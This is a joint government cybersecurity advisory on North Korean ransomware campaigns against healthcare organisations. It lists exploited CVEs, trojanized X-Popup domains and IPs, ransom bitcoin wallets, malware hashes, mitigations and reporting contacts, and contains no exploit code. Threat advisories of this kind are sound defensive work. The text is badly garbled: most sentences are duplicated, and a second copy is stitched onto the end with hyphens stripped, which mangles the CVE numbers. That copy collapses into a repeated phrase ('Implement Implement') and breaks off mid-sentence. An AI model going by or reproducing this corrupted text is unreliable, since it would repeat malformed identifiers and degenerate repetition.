actors used to gain access to and conduct ransomware attacks against Healthcare and Public Health (HPH) Sector organizations and other critical infrastructure sector entities, as well as DPRK cyber actors' use of cryptocurrency to demand ransoms.The authoring agencies assess that an unspecified amount of revenue from these cryptocurrency operations supports DPRK national-level priorities and objectives, including cyber operations targeting the United States and South Korea governments--specific targets include Department of Defense Information Networks and Defense Industrial Base member networks. The IOCs in this product should be useful to sectors previously targeted by DPRK cyber operations (e.g., U.S. government, Department of Defense, and Defense Industrial Base). The authoring agencies highly discourage paying ransoms as doing so does not guarantee files and records will be recovered and may pose sanctions risks.For additional information on state-sponsored DPRK malicious cyber activity, see CISA's North Korea Cyber Threat Overview and Advisories webpage.Download the PDF version of this report: pdf, 661 kb.For a downloadable copy of IOCs, seeTECHNICAL DETAILSNote: This advisory uses the MITRE ATT&CK for Enterprise framework, version 12. See MITRE ATT&CK for Enterprise for all referenced tactics and techniques.This CSA is supplementary to previous reports on malicious cyber actor activities involving DPRK ransomware campaigns--namely Maui and H0lyGh0st ransomware. The authoring agencies are issuing this advisory to highlight additional observed TTPs DPRK cyber actors are using to conduct ransomware attacks targeting South Korean and U.S. healthcare systems.Observable TTPsThe TTPs associated with DPRK ransomware attacks include those traditionally observed in ransomware operations. Additionally, these TTPs span phases from acquiring and purchasing infrastructure to concealing DPRK affiliation:Acquire Infrastructure [T1583] . DPRK actors generate domains, personas, and accounts, and identify cryptocurrency services to conduct their ransomware operations. Actors procure infrastructure, IP addresses, and domains with cryptocurrency generated through illicit cybercrime, such as ransomware and cryptocurrency theft.. DPRK actors generate domains, personas, and accounts, and identify cryptocurrency services to conduct their ransomware operations. Actors procure infrastructure, IP addresses, and domains with cryptocurrency generated through illicit cybercrime, such as ransomware and cryptocurrency theft. Obfuscate Identity . DPRK actors purposely obfuscate their involvement by operating with or under third-party foreign affiliate identities and use third-party foreign intermediaries to receive ransom payments.. DPRK actors purposely obfuscate their involvement by operating with or under third-party foreign affiliate identities and use third-party foreign intermediaries to receive ransom payments. Purchase VPNs and VPSs [T1583.003] . DPRK cyber actors will also use virtual private networks (VPNs) and virtual private servers (VPSs) or third-country IP addresses to appear to be from innocuous locations instead of from DPRK.. DPRK cyber actors will also use virtual private networks (VPNs) and virtual private servers (VPSs) or third-country IP addresses to appear to be from innocuous locations instead of from DPRK. Gain Access [TA0001] . Actors use various exploits of common vulnerabilities and exposures (CVE) to gain access and escalate privileges on networks. Recently observed CVEs that actors used to gain access include remote code execution in the Apache Log4j software library (known as Log4Shell) and remote code execution in unpatched SonicWall SMA 100 appliances [T1190 and T1133]. Observed CVEs used include:. Actors use various exploits of common vulnerabilities and exposures (CVE) to gain access and escalate privileges on networks. Recently observed CVEs that actors used to gain access include remote code execution in the Apache Log4j software library (known as Log4Shell) and remote code execution in unpatched SonicWall SMA 100 appliances [T1190 and T1133]. Observed CVEs used include: CVE 2021-44228CVE-2021-20038CVE-2022-24990Actors also likely spread malicious code through Trojanized files for ""X-Popup,"" an open source messenger commonly used by employees of small and medium hospitals in South Korea [T1195].The actors spread malware by leveraging two domains: xpopup.pe[.]kr and xpopup.com . xpopup.pe[.]kr is registered to IP address 115.68.95[.]128 and xpopup[.]com is registered to IP address 119.205.197[.]111 . Related file names and hashes are listed in table 1.Table 1: Malicious file names and hashes spread by xpopup domains File Name MD5 Hash xpopup.rar 1f239db751ce9a374eb9f908c74a31c9 X-PopUp.exe 6fb13b1b4b42bac05a2ba629f04e3d03 X-PopUp.exe cf8ba073db7f4023af2b13dd75565f3d xpopup.exe 4e71d52fc39f89204a734b19db1330d3 x-PopUp.exe 43d4994635f72852f719abb604c4a8a1 xpopup.exe 5ae71e8440bf33b46554ce7a7f3de666Move Laterally and Discovery [TA0007, TA0008] . After initial access, DPRK cyber actors use staged payloads with customized malware to perform reconnaissance activities, upload and download additional files and executables, and execute shell commands [T1083, T1021]. The staged malware is also responsible for collecting victim information and sending it to the remote host controlled by the actors [TA0010].. After initial access, DPRK cyber actors use staged payloads with customized malware to perform reconnaissance activities, upload and download additional files and executables, and execute shell commands [T1083, T1021]. The staged malware is also responsible for collecting victim information and sending it to the remote host controlled by the actors [TA0010]. Employ Various Ransomware Tools [TA0040] . Actors have used privately developed ransomware, such as Maui and H0lyGh0st [T1486]. Actors have also been observed using or possessing publically available tools for encryption, such as BitLocker, Deadbolt, ech0raix, GonnaCry, Hidden Tear, Jigsaw, LockBit 2.0, My Little Ransomware, NxRansomware, Ryuk, and YourRansom [T1486]. In some cases, DPRK actors have portrayed themselves as other ransomware groups, such as the REvil ransomware group. For IOCs associated with Maui and H0lyGh0st ransomware usage, please see Appendix B.. Actors have used privately developed ransomware, such as Maui and H0lyGh0st [T1486]. Actors have also been observed using or possessing publically available tools for encryption, such as BitLocker, Deadbolt, ech0raix, GonnaCry, Hidden Tear, Jigsaw, LockBit 2.0, My Little Ransomware, NxRansomware, Ryuk, and YourRansom [T1486]. In some cases, DPRK actors have portrayed themselves as other ransomware groups, such as the REvil ransomware group. For IOCs associated with Maui and H0lyGh0st ransomware usage, please see Appendix B. Demand Ransom in Cryptocurrency . DPRK cyber actors have been observed setting ransoms in bitcoin [T1486].. DPRK cyber actors have been observed setting ransoms in bitcoin [T1486]. Actors are known to communicate with victims via Proton Mail email accounts. For private companies in the healthcare sector, actors may threaten to expose a company's proprietary data to competitors if ransoms are not paid. Bitcoin wallet addresses possibly used by DPRK cyber actors include: 1MTHBCrBKYEthfa16zo9kabt4f9jMJz8Rm bc1q80vc4yjgg6umedkut3e9mhehxl4q4dcjjyzh59 1J8spy62o7z2AjQxoUpiCGnBh5cRWKVWJC 16ENLdHbnmDcEV8iqN4vuyZHa7sSdYRh76 bc1q3wzxvu8yhs8h7mlkmf7277wyklkah9k4sm9anu bc1q8xyt4jxhw7mgqpwd6qfdjyxgvjeuz57jxrvgk9 1NqihEqYaQaWiZkPVdSMiTbt7dTy1LMxgX bc1qxrpevck3pq1yzrx2pq2rkvkvy0jnm56nzjv6pw 14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk 1KCwfCUgnSy3pzNX7U1i5NwFzRtth4bRBc 16sYqXancDDiijcuruZecCkdBDwDf4vSEC 1N6JphHFaYmYaokS5xH31Z67bvk4ykd9CP LZ1VNJfn6mWjPzkCyoBvqWaBZYXAwn135 1KmWW6LgdgykBBrSXrFu9kdoHz95Fe9kQF 1FX4W9rrG4F3Uc7gJ18GCwGab8XuW8Ajy2 bc1qlqgu2l2kms5338zuc95kxavctzyy0v705tpvyc bc1qy6su7vrh7ts5ng2628escmhr98msmzg62ez2sp bc1q8t69gpxsezdcr8w6tfzp3jeptq4tcp2g9d0mwy bc1q9h7yj79sqm4t536q0fdn7n4y2atsvvl22m28ep bc1qj6y72rk039mqpgtcy7mwjd3eum6cx6027ndgmd bc1qcp557vltuu3qc6pk3ld0ayagrxuf2thp3pjzpe bc1ql8wsflrjf9zlusauynzjm83mupq6c9jz9vnqxg bc1qx60ec3nfd5yhsyyxkzkpts54w970yxj84zrdck bc1qunqnjdlvqkjuhtclfp8kzkjpvdz9qnk898xczp bc1q6024d73h48fnhwswhwt3hqz2lzw6x99q0nulm4 bc1qwdvexlyvg3mqvqw7g6l09qup0qew80wjj9jh7x bc1qavrtge4p7dmcrnvhlvuhaarx8rek76wxyk7dgg bc1qagaayd57vr25dlqgk7f00nhz9qepqgnlnt4upu bc1quvnaxnpqlzq3mdhfddh35j7e7ufxh3gpc56hca bc1qu0pvfmtxawm8s99lcjvxapungtsmkvwyvak6cs bc1qg3zlxxhhcvt6hkuhmqml8y9pas76cajcu9ltdl bc1qn7a3g23nzpuytchyyteyhkcse84cnylznl3j32 bc1qhfmqstxp3yp9muvuz29wk77vjtdyrkff4nrxpu bc1qnh8scrvuqvlzmzgw7eesyrmtes9c5m78duetf3 bc1q7qry3lsrphmnw3exs7tkwzpvzjcxs942aq8n0y bc1qcmlcxfsy0zlqhh72jvvc4rh7hvwhx6scp27na0 bc1q498fn0gauj2kkjsg35mlwk2cnxhaqlj7hkh8xy bc1qnz4udqkumjghnm2a3zt0w3ep8fwdcyv3krr3jq bc1qk0saaw7p0wrwla6u7tfjlxrutlgrwnudzx9tyw bc1qyue2pgjk09ps7qvfs559k8kee3jkcw4p4vdp57 bc1q6qfkt06xmrpclht3acmq00p7zyy0ejydu89zwv bc1qmge6a7sp659exnx78zhm9zgrw88n6un0rl9trs bc1qcywkd7zqlwmjy36c46dpf8cq6ts6wgkjx0u7cnMITIGATIONSNote: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the U.S. National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. For more information on the CPGs, including additional recommended baseline protections, see cisa.gov/cpg.The authoring agencies urge HPH organizations to:Limit access to data by authenticating and encrypting connections (e.g., using public key infrastructure certificates in virtual private network (VPN) and transport layer security (TLS) connections) with network services, Internet of Things (IoT) medical devices, and the electronic health record system [CPG 3.3].Implement the principle of least privilege by using standard user accounts on internal systems instead of administrative accounts [CPG 1.5], which grant excessive system administration privileges.Turn off weak or unnecessary network device management interfaces, such as Telnet, SSH, Winbox, and HTTP for wide area networks (WANs) and secure with strong passwords and encryption when enabled.Protect stored data by masking the permanent account number (PAN) when displayed and rendering it unreadable when stored--through cryptography, for example.Secure the collection, storage, and processing practices for personally identifiable information (PII)/protected health information (PHI), per regulations such as the Health Insurance Portability and Accountability Act of 1996 (HIPAA). Implementing HIPAA security measures could prevent the introduction of malware to the system [CPG 3.4]. Secure PII/ PHI at collection points and encrypt the data at rest and in transit using technologies, such as TLS. Only store personal patient data on internal systems that are protected by firewalls, and ensure extensive backups are available. Create and regularly review internal policies that regulate the collection, storage, access, and monitoring of PII/PHI.Implement and enforce multi-layer network segmentation with the most critical communications and data resting on the most secure and reliable layer [CPG 8.1].Use monitoring tools to observe whether IoT devices are behaving erratically due to a compromise [CPG 3.1].In addition, the authoring agencies urge all organizations, including HPH Sector organizations, to apply the following recommendations to prepare for and mitigate ransomware incidents:If a ransomware incident occurs at your organization:Follow your organization's ransomware response checklist.Scan backups. If possible, scan backup data with an antivirus program to check that it is free of malware. This should be performed using an isolated, trusted system to avoid exposing backups to potential compromise.U.S. organizations: Follow the notification requirements as outlined in your cyber incident response plan. Report incidents to appropriate authorities, in the U.S., this would include the FBI at a local FBI Field Office, CISA at cisa.gov/report, or the U.S. Secret Service (USSS) at a USSS Field Office.Follow the notification requirements as outlined in your cyber incident response plan. Report incidents to appropriate authorities, in the U.S., this would include the FBI at a local FBI Field Office, CISA at cisa.gov/report, or the U.S. Secret Service (USSS) at a USSS Field Office. South Korean organizations: Please report incidents to NIS, KISA (Korea Internet & Security Agency), and KNPA (Korean National Police Agency). NIS (National Intelligence Service) Telephone : 111 https://www.nis.go.kr KISA (Korea Internet & Security Agency) Telephone : 118 (Consult Service) https://www.boho.or.kr/consult/ransomware.do KNPA (Korean National Police Agency) Electronic Cybercrime Report & Management System: https://ecrm.police.go.kr/minwon/mainPlease report incidents to NIS, KISA (Korea Internet & Security Agency), and KNPA (Korean National Police Agency). Apply incident response best practices found in the joint Cybersecurity Advisory, Technical Approaches to Uncovering and Remediating Malicious Activity, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.RESOURCESStairwell provided a YARA rule to identify Maui ransomware, and a Proof of Concept public RSA key extractor at the following link:https://www.stairwell.com/news/threat-research-report-maui-ransomware/REQUEST FOR INFORMATIONThe FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, bitcoin wallet information, the decryptor file, and/or benign samples of encrypted files. As stated above, the authoring agencies discourage paying ransoms. Payment does not guarantee files will be recovered and may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. However, the agencies understand that when victims are faced with an inability to function, all options are evaluated to protect shareholders, employees, and customers.Regardless of whether you or your organization decide to pay a ransom, the authoring agencies urge you to promptly report ransomware incidents using the contact information above.ACKNOWLEDGEMENTSNSA, FBI, CISA, and HHS would like to thank ROK NIS and DSA for their contributions to this CSA.Disclaimer of endorsementThe information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.Trademark recognitionMicrosoft Threat Intelligence Center is a registered trademark of Microsoft Corporation. Apache(r), Sonicwall, and Apache Log4j are trademarks of Apache Software Foundation. TerraMaster Operating System is a registered trademark of Octagon Systems.PurposeThis document was developed in furtherance of the authors' cybersecurity missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.Appendix A: CVE DetailsCVE-2021-44228 CVSS 3.0: 10 (Critical) Vulnerability DescriptionApache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects. Recommended MitigationsApply patches provided by vendor and perform required system updates. Detection MethodsSee vendors' Guidance For Preventing, Detecting, and Hunting for Exploitation of the Log4j 2 Vulnerability. Vulnerable Technologies and VersionsThere are numerous vulnerable technologies and versions associated with CVE-2021-44228. For a full list, please check https://nvd.nist.gov/vuln/detail/CVE-2021-44228. See https://nvd.nist.gov/vuln/detail/CVE-2021-44228 for more information.CVE-2021-20038 CVSS 3.0: 9.8 (Critical) Vulnerability DescriptionA Stack-based buffer overflow vulnerability in SMA100 Apache httpd server's mod_cgi module environment variables allows a remote unauthenticated attacker to potentially execute code as a 'nobody' user in the appliance. This vulnerability affected SMA 200, 210, 400, 410 and 500v appliances firmware 10.2.0.8-37sv, 10.2.1.1-19sv, 10.2.1.2-24sv and earlier versions. Recommended MitigationsApply all appropriate vendor updatesUpgrade to: SMA 100 Series - (SMA 200, 210, 400, 410, 500v (ESX, Hyper-V, KVM, AWS, Azure):SonicWall SMA100 build versions 10.2.0.9-41sv or laterSonicWall SMA100 build versions 10.2.1.3-27sv or later System administrators should refer to the SonicWall Security Advisories in the reference section to determine affected applications/systems and appropriate fix actions. Support for 9.0.0 firmware ended on 10/31/2021. Customers still using that firmware are requested to upgrade to the latest 10.2.x versions. Vulnerable Technologies and VersionsSonicwall Sma 200 Firmware 10.2.0.8-37SvSonicwall Sma 200 Firmware 10.2.1.1-19SvSonicwall Sma 200 Firmware 10.2.1.2-24SvSonicwall Sma 210 Firmware 10.2.0.8-37SvSonicwall Sma 210 Firmware 10.2.1.1-19SvSonicwall Sma 210 Firmware 10.2.1.2-24SvSonicwall Sma 410 Firmware 10.2.0.8-37SvSonicwall Sma 410 Firmware 10.2.1.1-19SvSonicwall Sma 410 Firmware 10.2.1.2-24SvSonicwall Sma 400 Firmware 10.2.0.8-37SvSonicwall Sma 400 Firmware 10.2.1.1-19SvSonicwall Sma 400 Firmware 10.2.1.2-24SvSonicwall Sma 500V Firmware 10.2.0.8-37SvSonicwall Sma 500V Firmware 10.2.1.1-19SvSonicwall Sma 500V Firmware 10.2.1.2-24Sv See https://nvd.nist.gov/vuln/detail/CVE-2021-20038 for more information.CVE-2022-24990 CVSS 3.x: N/A Vulnerability DescriptionThe TerraMaster OS Unauthenticated Remote Command Execution via PHP Object Instantiation Vulnerability is characterized by scanning activity targeting a flaw in the script enabling a remote adversary to execute commands on the target endpoint. The vulnerability is created by improper input validation of the webNasIPS component in the api.php script and resides on the TNAS device appliances' operating system where users manage storage, backup data, and configure applications. By exploiting the script flaw a remote unauthenticated attacker can pass specially crafted data to the application and execute arbitrary commands on the target system. This may result in complete compromise of the target system, including the exfiltration of information. TNAS devices can be chained to acquire unauthenticated remote code execution with highest privileges. Recommended MitigationsInstall relevant vendor patches. This vulnerability was patched in TOS version 4.2.30 Vulnerable Technologies and VersionsTOS v 4.2.29 See https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/ and https://forum.terra-master.com/en/viewtopic.php?t=3030 for more information.Appendix B: Indicators of Compromise (IOCs)The IOC section includes hashes and IP addresses for the Maui and H0lyGh0st ransomware variants--as well as custom malware implants assumedly developed by DPRK cyber actors, such as remote access trojans (RATs), loaders, and other tools--that enable subsequent deployment of ransomware. For additional Maui IOCs, see joint CSA North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector.Table 2 lists MD5 and SHA256 hashes associated with malware implants, RATs, and other tools used by DPRK cyber actors, including tools that drop Maui ransomware files.Table 2: File names and hashes of malicious implants, RATs, and tools MD5Hash SHA256Hash 079b4588eaa99a1e802adf5e0b26d8aa f67ee77d6129bd1bcd5d856c0fc5314169b946d32b8abaa4e680bb98130b38e7 0e9e256d8173854a7bc26982b1dde783 -- 12c15a477e1a96120c09a860c9d479b3 6263e421e397db821669420489d2d3084f408671524fd4e1e23165a16dda2225 131fc4375971af391b459de33f81c253 -- 17c46ed7b80c2e4dbea6d0e88ea0827c b9af4660da00c7fa975910d0a19fda072031c15fad1eef935a609842c51b7f7d 1875f6a68f70bee316c8a6eda9ebf8de 672ec8899b8ee513dbfc4590440a61023846ddc2ca94c88ae637144305c497e7 1a74c8d8b74ca2411c1d3d22373a6769 ba8f9e7afe5f78494c111971c39a89111ef9262bf23e8a764c6f65c818837a44 1f6d9f8fbdbbd4e6ed8cd73b9e95a928 4f089afa51fd0c1b2a39cc11cedb3a4a326111837a5408379384be6fe846e016 2d02f5499d35a8dffb4c8bc0b7fec5c2 830207029d83fd46a4a89cd623103ba2321b866428aa04360376e6a390063570 2e18350194e59bc6a2a3f6d59da11bd8 655aa64860f1655081489cf85b77f72a49de846a99dd122093db4018434b83ae 3bd22e0ac965ebb6a18bb71ba39e96dc 6b7f566889b80d1dba4f92d5e2fb2f5ef24f57fcfd56bb594978dffe9edbb9eb 40f21743f9cb927b2c84ecdb7dfb14a6 5081f54761947bc9ce4aa2a259a0bd60b4ec03d32605f8e3635c4d4edaf48894 4118d9adce7350c3eedeb056a3335346 5b7ecf7e9d0715f1122baf4ce745c5fcd769dee48150616753fec4d6da16e99e 43e756d80225bdf1200bc34eef5adca8 afb2d4d88f59e528f0e388705113ae54b7b97db4f03a35ae43cc386a48f263a0 47791bf9e017e3001ddc68a7351ca2d6 863b707873f7d653911e46885e261380b410bb3bf6b158daefb47562e93cb657 505262547f8879249794fc31eea41fc6 f32f6b229913d68daad937cc72a57aa45291a9d623109ed48938815aa7b6005c 5130888a0ad3d64ad33c65de696d3fa2 c92c1f3e77a1876086ce530e87aa9c1f9cbc5e93c5e755b29cad10a2f3991435 58ad3103295afcc22bde8d81e77c282f 18b75949e03f8dcad513426f1f9f3ca209d779c24cd4e941d935633b1bec00cb 5be1e382cd9730fbe386b69bd8045ee7 5ad106e333de056eac78403b033b89c58b4c4bdda12e2f774625d47ccfd3d3ae 5c6f9c83426c6d33ff2d4e72c039b747 a3b7e88d998078cfd8cdf37fa5454c45f6cbd65f4595fb94b2e9c85fe767ad47 640e70b0230dc026eff922fb1e44c2ea 6319102bac226dfc117c3c9e620cd99c7eafbf3874832f2ce085850aa042f19c 67f4dad1a94ed8a47283c2c0c05a7594 3fe624c33790b409421f4fa2bb8abfd701df2231a959493c33187ed34bec0ae7 70652edadedbacfd30d33a826853467d 196fb1b6eff4e7a049cea323459cfd6c0e3900d8d69e1d80bffbaabd24c06eba 739812e2ae1327a94e441719b885bd19 6122c94cbfa11311bea7129ecd5aea6fae6c51d23228f7378b5f6b2398728f67 76c3d2092737d964dfd627f1ced0af80 bffe910904efd1f69544daa9b72f2a70fb29f73c51070bde4ea563de862ce4b1 802e7d6e80d7a60e17f9ffbd62fcbbeb 87bdb1de1dd6b0b75879d8b8aef80b562ec4fad365d7abbc629bcfc1d386afa6 827103a6b6185191fd5618b7e82da292 -- 830bc975a04ab0f62bfedf27f7aca673 -- 85995257ac07ae5a6b4a86758a2283d7 -- 85f6e3e3f0bdd0c1b3084fc86ee59d19 f1576627e8130e6d5fde0dbe3dffcc8bc9eef1203d15fcf09cd877ced1ccc72a 87a6bda486554ab16c82bdfb12452e8b 980bb08ef3e8afcb8c0c1a879ec11c41b29fd30ac65436495e69de79c555b2be 891db50188a90ddacfaf7567d2d0355d 0837dd54268c373069fc5c1628c6e3d75eb99c3b3efc94c45b73e2cf9a6f3207 894de380a249e677be2acb8fbdfba2ef -- 8b395cc6ecdec0900facf6e93ec48fbb -- 92a6c017830cda80133bf97eb77d3292 d1aba3f95f11fc6e5fec7694d188919555b7ff097500e811ff4a5319f8f230be 9b0e7c460a80f740d455a7521f0eada1 45d8ac1ac692d6bb0fe776620371fca02b60cac8db23c4cc7ab5df262da42b78 9b9d4cb1f681f19417e541178d8c75d7 f5f6e538001803b0aa008422caf2c3c2a79b2eeee9ddc7feda710e4aba96fea4 a1f9e9f5061313325a275d448d4ddd59 dfdd72c9ce1212f9d9455e2bca5a327c88d2d424ea5c086725897c83afc3d42d a452a5f693036320b580d28ee55ae2a3 99b0056b7cc2e305d4ccb0ac0a8a270d3fceb21ef6fc2eb13521a930cea8bd9f a6e1efd70a077be032f052bb75544358 3b9fe1713f638f85f20ea56fd09d20a96cd6d288732b04b073248b56cdaef878 ad4eababfe125110299e5a24be84472e a557a0c67b5baa7cf64bd4d42103d3b2852f67acf96b4c5f14992c1289b55eaa b1c1d28dc7da1d58abab73fa98f60a83 38491f48d0cbaab7305b5ddca64ba41a2beb89d81d5fb920e67d0c7334c89131 b6f91a965b8404d1a276e43e61319931 -- bdece9758bf34fcad9cba1394519019b 9d6de05f9a3e62044ad9ae66111308ccb9ed2ee46a3ea37d85afa92e314e7127 c3850f4cc12717c2b54753f8ca5d5e0e 99b448e91669b92c2cc3417a4d9711209509274dab5d7582baacfab5028a818c c50b839f2fc3ce5a385b9ae1c05def3a 458d258005f39d72ce47c111a7d17e8c52fe5fc7dd98575771640d9009385456 cf236bf5b41d26967b1ce04ebbdb4041 60425a4d5ee04c8ae09bfe28ca33bf9e76a43f69548b2704956d0875a0f25145 d0e203e8845bf282475a8f816340f2e8 f6375c5276d1178a2a0fe1a16c5668ce523e2f846c073bf75bb2558fdec06531 ddb1f970371fa32faae61fc5b8423d4b dda53eee2c5cb0abdbf5242f5e82f4de83898b6a9dd8aa935c2be29bafc9a469 f2f787868a3064407d79173ac5fc0864 92adc5ea29491d9245876ba0b2957393633c9998eb47b3ae1344c13a44cd59ae fda3a19afa85912f6dc8452675245d6b 56925a1f7d853d814f80e98a1c4890b0a6a84c83a8eded34c585c98b2df6ab19 -- 0054147db54544d77a9efd9baf5ec96a80b430e170d6e7c22fcf75261e9a3a71 -- 151ab3e05a23e9ccd03a6c49830dabb9e9281faf279c31ae40b13e6971dd2fb8 -- 1c926fb3bd99f4a586ed476e4683163892f3958581bf8c24235cd2a415513b7f -- 1f8dcfaebbcd7e71c2872e0ba2fc6db81d651cf654a21d33c78eae6662e62392 -- f226086b5959eb96bd30dec0ffcbf0f09186cd11721507f416f1c39901addafb -- 23eff00dde0ee27dabad28c1f4ffb8b09e876f1e1a77c1e6fb735ab517d79b76 -- 586f30907c3849c363145bfdcdabe3e2e4688cbd5688ff968e984b201b474730 -- 8ce219552e235dcaf1c694be122d6339ed4ff8df70bf358cd165e6eb487ccfc5 -- 90fb0cd574155fd8667d20f97ac464eca67bdb6a8ee64184159362d45d79b6a4 -- c2904dc8bbb569536c742fca0c51a766e836d0da8fac1c1abd99744e9b50164f -- ca932ccaa30955f2fffb1122234fb1524f7de3a8e0044de1ed4fe05cab8702a5 -- f6827dc5af661fbb4bf64bc625c78283ef836c6985bb2bfb836bd0c8d5397332 -- f78cabf7a0e7ed3ef2d1c976c1486281f56a6503354b87219b466f2f7a0b65c4Table 3 lists MD5 and SHA256 hashes are associated with Maui Ransomware files.Table 3: File names and hashes of Maui ransomware files MD5 Hash SHA256 Hash 4118d9adce7350c3eedeb056a3335346 5b7ecf7e9d0715f1122baf4ce745c5fcd769dee48150616753fec4d6da16e99e 9b0e7c460a80f740d455a7521f0eada1 45d8ac1ac692d6bb0fe776620371fca02b60cac8db23c4cc7ab5df262da42b78 fda3a19afa85912f6dc8452675245d6b 56925a1f7d853d814f80e98a1c4890b0a6a84c83a8eded34c585c98b2df6ab19 2d02f5499d35a8dffb4c8bc0b7fec5c2 830207029d83fd46a4a89cd623103ba2321b866428aa04360376e6a390063570 c50b839f2fc3ce5a385b9ae1c05def3a 458d258005f39d72ce47c111a7d17e8c52fe5fc7dd98575771640d9009385456 a452a5f693036320b580d28ee55ae2a3 99b0056b7cc2e305d4ccb0ac0a8a270d3fceb21ef6fc2eb13521a930cea8bd9f a6e1efd70a077be032f052bb75544358 3b9fe1713f638f85f20ea56fd09d20a96cd6d288732b04b073248b56cdaef878 802e7d6e80d7a60e17f9ffbd62fcbbeb 87bdb1de1dd6b0b75879d8b8aef80b562ec4fad365d7abbc629bcfc1d386afa6 -- 0054147db54544d77a9efd9baf5ec96a80b430e170d6e7c22fcf75261e9a3a71Table 4 lists MD5 and SHA256 hashes associated with H0lyGh0st Ransomware files.SHA256 Hash 99fc54786a72f32fd44c7391c2171ca31e72ca52725c68e2dde94d04c286fccd* F8fc2445a9814ca8cf48a979bff7f182d6538f4d1ff438cf259268e8b4b76f86* Bea866b327a2dc2aa104b7ad7307008919c06620771ec3715a059e675d9f40af* 6e20b73a6057f8ff75c49e1b7aef08abfcfe4e418e2c1307791036f081335c2d f4d10b08d7dacd8fe33a6b54a0416eecdaed92c69c933c4a5d3700b8f5100fad 541825cb652606c2ea12fd25a842a8b3456d025841c3a7f563655ef77bb67219 2d978df8df0cf33830aba16c6322198e5889c67d49b40b1cb1eb236bd366826d 414ed95d14964477bebf86dced0306714c497cde14dede67b0c1425ce451d3d7 Df0c7bb88e3c67d849d78d13cee30671b39b300e0cda5550280350775d5762d8MD5 Hash a2c2099d503fcc29478205f5aef0283b 9c516e5b95a7e4169ecbd133ed4d205f d6a7b5db62bf7815a10a17cdf7ddbd4b c6949a99c60ef29d20ac8a9a3fb58ce5 4b20641c759ed563757cdd95c651ee53 25ee4001eb4e91f7ea0bc5d07f2a9744 18126be163eb7df2194bb902c359ba8e eaf6896b361121b2c315a35be837576d e4ee611533a28648a350f2dab85bb72a e268cb7ab778564e88d757db4152b9fa* from Microsoft blog post on h0lygh0stCONTACT INFORMATIONNSA Client Requirements / General Cybersecurity Inquiries: CybersecurityReports@nsa.govDefense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.govTo report incidents and anomalous activity related to information found in this Joint Cybersecurity Advisory, contact CISA's 24/7 Operations Center at Report@cisa.gov or (888) 282-0870 or your local FBI field office at www.fbi.gov/contact-us/field. When available, please include the following information regarding the incident: date, time, and location of the incident, type of activity, number of people affected, type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact.Media Inquiries / Press Desk:";"The authoring agencies assess that an unspecified amount of revenue from these cryptocurrency operations supports DPRK nationallevel priorities and objectives, including cyber operations targeting the United States and South Korea governmentsspecific targets include Department of Defense Information Networks and Defense Industrial Base member networks. The IOCs in this product should be useful to sectors previously targeted by DPRK cyber operations (e.g., U.S. government, Department of Defense, and Defense Industrial Base). The authoring agencies highly discourage paying ransoms as doing so does not guarantee files and records will be recovered and may pose sanctions risks. DPRK actors purposely obfuscate their involvement by operating with or under thirdparty foreign affiliate identities and use thirdparty foreign intermediaries to receive ransom payments. Purchase VPNs and VPSs. DPRK cyber actors will also use virtual private networks (VPNs) and virtual private servers (VPSs) or thirdcountry IP addresses to appear to be from innocuous locations instead of from DPRK. Gain Access. Actors use various exploits of common vulnerabilities and exposures (CVE) to gain access and escalate privileges on networks. Recently observed CVEs that actors used to gain access include remote code execution in the Apache Log4j software library (known as Log4Shell) and remote code execution in unpatched SonicWall SMA 100 appliances [T1190 and T1133]. Observed CVEs used include: CVE 202144228CVE202120038CVE202224990Actors also likely spread malicious code through Trojanized files for ""XPopup,"" an open source messenger commonly used by employees of small and medium hospitals in South Korea [T1195].The actors spread malware by leveraging two domains: xpopup.pe[. ]kr and xpopup.com . xpopup.pe[. DPRK actors have been observed using or possessing publically available tools for encryption, such as BitLocker, Deadbolt, ech0raix, GonnaCry, Hidden Tear, Jigsaw, LockBit 2.0, My Little Ransomware, NxRansomware, Ryuk, and YourRansom. In some cases, DPRK actors have portrayed themselves as other ransomware groups, such as the REvil ransomware group. For IOCs associated with Maui and H0lyGh0st ransomware usage, please see Appendix B. HPH organizations should implement the following mitigations: Limit access to data by authenticating and encrypting connections (e.g., using public key infrastructure certificates in VPN and TLS connections). Implement the principle of least privilege by using standard user accounts on internal systems instead of administrative accounts. Turn off weak or unnecessary network device management interfaces, such as Telnet, SSH, Winbox, and HTTP for WANs and secure with strong passwords and encryption when enabled. Protect stored data by masking the PAN when displayed and unreadable when stored. Secure the collection, storage, and processing practices for PII/PHI. HPH organizations should implement the principle of least privilege. Implement the principle of least privilege. Implement the principle of least privilege. Implement the principle of least privilege Implement the principle Implement Implement The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, bitcoin wallet information, the decryptor file, and/or benign samples of encrypted files. CVE202144228 CVSS 3.0: 10 (Critical) Vulnerability DescriptionApache Log4j2 2.0beta9 through 2.15.0 (excluding security releases 